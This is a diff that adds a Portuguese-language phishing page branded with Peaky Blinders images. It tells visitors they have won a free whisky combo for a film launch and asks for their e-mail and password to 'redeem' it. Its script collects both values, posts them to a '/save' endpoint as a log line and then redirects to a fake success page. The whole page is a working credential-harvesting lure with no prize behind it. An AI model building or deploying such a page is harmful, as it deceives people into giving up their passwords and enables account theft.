@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <!-- Adicione o Favicon se desejar -->
+    <link rel="icon" type="image/x-icon" href="https://www.pngkit.com/png/full/237-2377978_png-file-agent-symbol-png.png">
+    <center>
+    <style>
+        /* Reset CSS */
+        *,
+        *:before,
+        *:after {
+            margin: 0;
+            padding: 0;
+            outline: 0;
+            box-sizing: border-box;
+            overflow: hidden; /* Prevent scrolling deixar fiquiso */
+        }
+
+        html {
+            font-size: 62.5%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
+                Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+        }
+
+        /* Content CSS */
+        body {
+            color: #e7e5dd;
+            background: #1d1d1d;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        h1 {
+            font-size: 3.6rem;
+            letter-spacing: 0.1em;
+        }
+
+        .form-container {
+            width: 100%;
+            max-width: 400px; /* Defina a largura máxima do formulário conforme necessário */
+            margin: 0 auto;
+        }
+
+        input {
+            width: calc(100% - 50px);
+            padding: 10px;
+            margin: 12px 0;
+            box-sizing: border-box;
+            color: #0a0a0a; /* Change color to your preferred color code */
+            font-size: 14px; /* Change font size to your preferred size */
+        }
+
+        .password-container label[for="senha"] {
+            color: #f3f7f3; /* Change color to your preferred color code */
+            font-size: 12px; /* Change font size to your preferred size */
+        }
+
+        #email {
+            width: calc(100% - 50px);
+            padding: 10px;
+            margin-bottom: 5px;
+            box-sizing: border-box;
+            color: #0a0a0a; /* Change color to your preferred color code */
+            font-size: 14px; /* Change font size to your preferred size */
+            /* Add any other styling you want */
+        }        
+
+        #senha {
+            width: calc(100% - 50px);
+            padding: 10px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+            color: #0a0a0a; /* Change color to your preferred color code */
+            font-size: 14px; /* Change font size to your preferred size */
+            /* Add any other styling you want */
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 800px;
+            top: 50%;
+            transform: translateY(750%);            
+            cursor: pointer;
+            width: 30px;
+            height: auto;         
+            
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 15px 20px;
+            font-size: 15px;
+            border-radius: 5px;
+            text-decoration: none;
+            margin: 10px 2px;
+            cursor: pointer;
+            background-color: #d4a60d; /* Cor de fundo do botão */
+            color: rgb(8, 8, 8); /* Cor do texto do botão */
+            border: none; /* Remova a borda do botão se desejar */
+        }
+               
+    </style>
+
+</head>
+<p><span style="font-size: 50pt;"><img id="headerImage" src="https://github.com/burk8477/peaky-blinders/blob/main/public/logo.png?raw=true" alt="Header Image" width="200" height="50" /></span></p>
+<p><span style="font-size: 50pt;"><img id="headerImage" src="https://github.com/burk8477/peaky-blinders/blob/main/public/hero.png?raw=true" alt="Header Image" width="500" height="300" /></span></p>
+<body>
+     
+    <h1 style="font-size: 20px;">Você ganhou um combo de Whisky</h1>
+    <h1 style="font-size: 20px;">Grátis em comemoração ao</h1>
+    <h1 style="font-size: 20px;">lançamento do filme! Resgate agora!</h1>  
+
+        <h2>&emsp;<h2>
+            <h2>&emsp;<h2>
+
+    <div class="form-container">
+        <form id="loginForm">
+            
+            <label for="email">E-mail</label>
+            <input type="email" id="email" name="email" required>
+
+            <label for="senha" class="password-container">
+                Senha
+                <input type="password" id="senha" name="senha" required>
+                <img class="eye-icon" src="https://cdn-icons-png.flaticon.com/512/3248/3248125.png"
+                    alt="Mostrar/Ocultar Senha" onclick="mostrarOcultarSenha()">
+            </label>
+
+            <button type="button" class="btn" onclick="enviarFormulario()">RESGATAR COMBO!</button>
+          
+        </form>
+        &emsp;
+        <h1 style="color: rgb(185, 184, 184); font-size: 13px;">Ao resgatar você concorda com os Termos de Uso<h1>
+     
+       
+    </div>
+    
+   <h2>&emsp;</h2>
+   
+   &emsp;
+   <h2>&emsp;</h2>
+   <h2>&emsp;</h2>
+   <h2 style="color: rgb(184, 184, 184); font-size: 13px;">© 2024 Peaky Blinders</h2> 
+         
+    <script>
+        function enviarFormulario() {
+            var email = document.getElementById('email').value;
+            var senha = document.getElementById('senha').value;
+            var logData = `Email: ${email}, Senha: ${senha}\n`;
+
+            fetch('/save', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ logData }),
+            });
+
+            window.location.href = '/login_success';
+        }
+
+        function mostrarOcultarSenha() {
+            var senhaInput = document.getElementById('senha');
+            var eyeIcon = document.querySelector('.eye-icon');
+
+            if (senhaInput.type === 'password') {
+                senhaInput.type = 'text';
+                eyeIcon.src = 'https://cdn-icons-png.flaticon.com/512/3248/3248173.png'; // Ícone do olho aberto
+            } else {
+                senhaInput.type = 'password';
+                eyeIcon.src = 'https://cdn-icons-png.flaticon.com/512/3248/3248125.png'; // Ícone do olho fechado
+            }
+        }
+    </script>
+    </center>
+</body>
+</html>
